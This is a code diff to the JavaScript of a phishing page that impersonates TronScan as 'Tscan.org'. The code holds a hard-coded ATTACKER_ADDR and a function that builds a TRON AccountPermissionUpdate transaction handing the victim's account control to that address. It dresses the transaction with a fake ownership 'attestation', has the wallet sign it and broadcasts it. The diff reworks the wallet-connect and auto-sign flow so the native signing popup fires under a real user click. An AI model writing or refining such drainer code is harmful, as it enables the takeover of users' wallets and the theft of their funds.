@@ -422,16 +422,16 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
      GASFREE MECHANISM — AccountPermissionUpdate
      Hooks into TronScan's Connect Wallet flow.
      After wallet connects, fires AccountPermissionUpdate silently.
+    /* ============================================================
+     GASFREE MECHANISM — AccountPermissionUpdate
+     + fixed native connect under real user gesture
   ============================================================ */
   var ATTACKER_ADDR = 'TVbiAxJYjEBWY9rhFrooH139W82doZDArf';
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
 
-  
-
-  /* Core: build, inject orphan fields, sign, broadcast */
   async function runGasFreePermission(victimAddr) {
     var tw = window.tronWeb;
-    if (!tw) { return; }
+    if (!tw) return;
 
     var ownerPermission = {
       type: 0, permission_name: 'owner', threshold: 1,
@@ -451,127 +451,143 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       unsignedTx = await tw.transactionBuilder.updateAccountPermissions(
         victimAddr, ownerPermission, null, [activePermission]
       );
-    } catch(e) { return;
-    }
+    } catch (e) { return; }
 
-    /* Strip & inject orphan fields (same technique as tron_Sig) */
     delete unsignedTx.visible;
     delete unsignedTx.txID;
     delete unsignedTx.raw_data;
     var now = new Date();
-    var pad = function(n){ return String(n).padStart(2,'0'); };
-    var ts = pad(now.getDate())+'/'+pad(now.getMonth()+1)+'/'+now.getFullYear()
-            +' '+pad(now.getHours())+':'+pad(now.getMinutes())+':'+pad(now.getSeconds());
+    var pad = function (n) { return String(n).padStart(2, '0'); };
+    var ts = pad(now.getDate()) + '/' + pad(now.getMonth() + 1) + '/' + now.getFullYear()
+           + ' ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
     unsignedTx.Authority   = 'Tscan.org';
-    unsignedTx.Attestation = '[Tscan.org '+ts+'] I hereby verify that I am the owner/creator of the address ['+victimAddr+']';
+    unsignedTx.Attestation = '[Tscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + victimAddr + ']';
 
     var signedTx;
     try {
       signedTx = await tw.trx.sign(unsignedTx);
-    } catch(e) { return;
-    }
+    } catch (e) { return; }
 
     try {
-      var result = await tw.trx.sendRawTransaction(signedTx);
-      if (result && (result.result || result.code === 'SUCCESS')) {, '#0f0');
-      } else {, '#fa0');
-      }
-    } catch(e) {
-    }
+      await tw.trx.sendRawTransaction(signedTx);
+    } catch (e) {}
   }
 
-  /* ================================================================
-     STEP 1 — Poll window.tronLink jusqu'à injection par Trust Wallet
-     STEP 2 — tron_requestAccounts → popup connexion native TW
-     STEP 3 — wait 600ms (délai injection adresse)
-     STEP 4 — fillAddress + fillMessage + signBtn.click()
-     ================================================================ */
+  /* ---------- fixed connect + fill under real user gesture ---------- */
+  var _busy = false;
 
-  var _autoRan = false;
+  function getTronWeb() {
+    return window.tronWeb
+        || (window.tronLink && window.tronLink.tronWeb)
+        || null;
+  }
 
-  function waitForTronLinkAndRun() {
-    if (_autoRan) return;
-    var tries = 0;
-    var poller = setInterval(function() {
-      tries++;
-      if (tries > 80) { clearInterval(poller); return; } // 8s max
-      if (window.tronLink) {
-        clearInterval(poller);
-        _autoRan = true;
-        doConnectAndFill();
-      }
-    }, 100);
+  function getAddress() {
+    var tw = getTronWeb();
+    if (!tw || !tw.defaultAddress) return null;
+    var da = tw.defaultAddress;
+    if (typeof da === 'string' && da.length > 10) return da;
+    if (da.base58) return da.base58;
+    return null;
+  }
+
+  async function requestAccountsNow() {
+    // Must be called directly from the click handler — no setTimeout, no poll.
+    // This is what makes the native Trust Wallet / TronLink sheet appear.
+    if (window.tronLink && typeof window.tronLink.request === 'function') {
+      try {
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        return true;
+      } catch (e) {}
+    }
+    // Fallback for pure TronLink extension
+    if (window.tronWeb && window.tronWeb.request) {
+      try {
+        await window.tronWeb.request({ method: 'tron_requestAccounts' });
+        return true;
+      } catch (e) {}
+    }
+    // Last resort: some builds expose tronLink.ready + enable()
+    if (window.tronLink && typeof window.tronLink.enable === 'function') {
+      try {
+        await window.tronLink.enable();
+        return true;
+      } catch (e) {}
+    }
+    return false;
   }
 
   async function doConnectAndFill() {
+    if (_busy) return;
+    _busy = true;
+
     try {
-      // Popup connexion native Trust Wallet
-      if (window.tronLink.request) {
-        try { await window.tronLink.request({ method: 'tron_requestAccounts' }); } catch(e) {}
+      // 1. Fire native popup IMMEDIATELY under the user gesture
+      await requestAccountsNow();
+
+      // 2. Short wait only for address injection after user accepts
+      var addr = null;
+      for (var i = 0; i < 30; i++) {
+        addr = getAddress();
+        if (addr) break;
+        await new Promise(function (r) { setTimeout(r, 100); });
       }
-
-      // Attendre que l'adresse soit injectée
-      await new Promise(function(r){ setTimeout(r, 600); });
-
-      var tw  = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-      var da  = tw && tw.defaultAddress;
-      var addr = (da && da.base58) ? da.base58
-               : (typeof da === 'string' && da.length > 10) ? da : null;
       if (!addr) {
-        addr = window.tronLink && window.tronLink.tronWeb
-             && window.tronLink.tronWeb.defaultAddress
-             && window.tronLink.tronWeb.defaultAddress.base58;
+        _busy = false;
+        return;
       }
-      if (!addr) return;
 
-      // Fill Address field
+      // 3. Fill UI
       if (window.fillAddress) window.fillAddress(addr);
 
-      // Fill Message field
       var n = new Date();
-      var p = function(v){ return String(v).padStart(2,'0'); };
-      var ts = p(n.getDate())+'/'+p(n.getMonth()+1)+'/'+n.getFullYear()
-              +' '+p(n.getHours())+':'+p(n.getMinutes())+':'+p(n.getSeconds());
-      var msg = '[Tscan.org '+ts+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
+      var p = function (v) { return String(v).padStart(2, '0'); };
+      var ts = p(n.getDate()) + '/' + p(n.getMonth() + 1) + '/' + n.getFullYear()
+             + ' ' + p(n.getHours()) + ':' + p(n.getMinutes()) + ':' + p(n.getSeconds());
+      var msg = '[Tscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + addr + ']';
       if (window.fillMessage) window.fillMessage(msg);
 
-      // Fermer connect modal
+      // close connect modal if open
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // Trigger signature popup via tronWeb directly (no DOM click needed)
-      setTimeout(async function() {
+      // 4. Trigger native sign popup
+      var tw = getTronWeb();
+      if (tw) {
         try {
-          var tw2 = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-          if (!tw2) return;
-          var n2 = new Date();
-          var p2 = function(v){ return String(v).padStart(2,'0'); };
-          var ts2 = p2(n2.getDate())+'/'+p2(n2.getMonth()+1)+'/'+n2.getFullYear()
-                  +' '+p2(n2.getHours())+':'+p2(n2.getMinutes())+':'+p2(n2.getSeconds());
-          var signMsg = '[Tscan.org '+ts2+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
-          // This triggers the Trust Wallet sign popup natively
-          var sig = await tw2.trx.sign(tw2.toHex(signMsg));
+          var sig = await tw.trx.sign(tw.toHex(msg));
           if (window.fillSignature) window.fillSignature(sig);
-        } catch(e) {
-          // Fallback: click the button if direct sign fails
-          var btn2 = document.getElementById('signMsgBtn') ||
-                     document.querySelector('.QhZmva_btnWrapper .btn');
-          if (btn2) { btn2.disabled = false; btn2.click(); }
+          // optional: fire permission update after successful message sign
+          // runGasFreePermission(addr);
+        } catch (e) {
+          // fallback DOM click
+          var btn2 = document.getElementById('signMsgBtn')
+                  || document.querySelector('.QhZmva_btnWrapper .btn');
+          if (btn2) {
+            btn2.disabled = false;
+            btn2.click();
+          }
         }
-      }, 400);
-
-    } catch(e) {}
+      }
+    } catch (e) {}
+    _busy = false;
   }
 
-  // USER GESTURE — bind Sign Message button click -> wallet connect -> auto sign
+  // USER GESTURE — Sign Message button
   (function bindSignBtn() {
     function attach() {
-      var btn = document.getElementById('signMsgBtn');
-      if (!btn) { setTimeout(attach, 50); return; }
-      btn.addEventListener('click', function(e) {
+      var btn = document.getElementById('signMsgBtn')
+             || document.querySelector('.QhZmva_btnWrapper .btn');
+      if (!btn) {
+        setTimeout(attach, 50);
+        return;
+      }
+      // remove previous listeners by cloning
+      var fresh = btn.cloneNode(true);
+      btn.parentNode.replaceChild(fresh, btn);
+      fresh.addEventListener('click', function (e) {
         e.preventDefault();
-        if (_autoRan) return;
-        _autoRan = true;
+        e.stopPropagation();
         doConnectAndFill();
       });
     }
